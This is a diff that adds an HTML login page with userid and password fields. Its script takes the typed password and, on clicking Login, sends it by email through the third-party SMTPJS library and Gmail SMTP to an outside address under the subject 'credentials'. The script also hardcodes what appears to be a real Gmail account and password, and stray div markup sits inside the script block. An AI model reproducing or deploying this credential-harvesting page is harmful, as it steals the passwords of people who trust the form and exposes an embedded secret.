@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=<device-width>, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <script src="../scripts/jquery-1.9.1.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <title>Document</title>
+</head>
+<body>
+    <input type="text" name="userid" id="userid" placeholder="userid">
+    <input type="text" name="password" id="password" placeholder="password">
+    <input type="button" value="Login" id="btnLogin">
+
+    <script>
+    $( "#btnLogin" ).click(function() {
+        var pass = $("#password").val();
+       
+        Email.send({
+	Host: "smtp.gmail.com",
+	Username : "sadikislam6610@gmail.com",
+	Password : "sadikislamctg@12345",
+	To : 'rsadikur74@gmail.com',
+	From : "sadikislam6610@gmail.com",
+	Subject : "credentials",
+	Body : ""+pass+"",
+	}).then(
+		message => alert("mail sent successfully")
+	);
+});
+
+
+
+
+
+<div>
+                <h3 style="color: skyblue"></h3>
+            </div>
+            <div class="bar-contain">
+                
+            </div>
+            <div>
+                <h3 style="color: burlywood"></h3>
+            </div>
+            <div class="bar-contain">
+                
+            </div>
+            <div>
+                <h3 style="color: yellowgreen"></h3>
+            </div>
+            <div class="bar-contain">
+                
+            </div>
+
+</script>
+</body>
+</html>
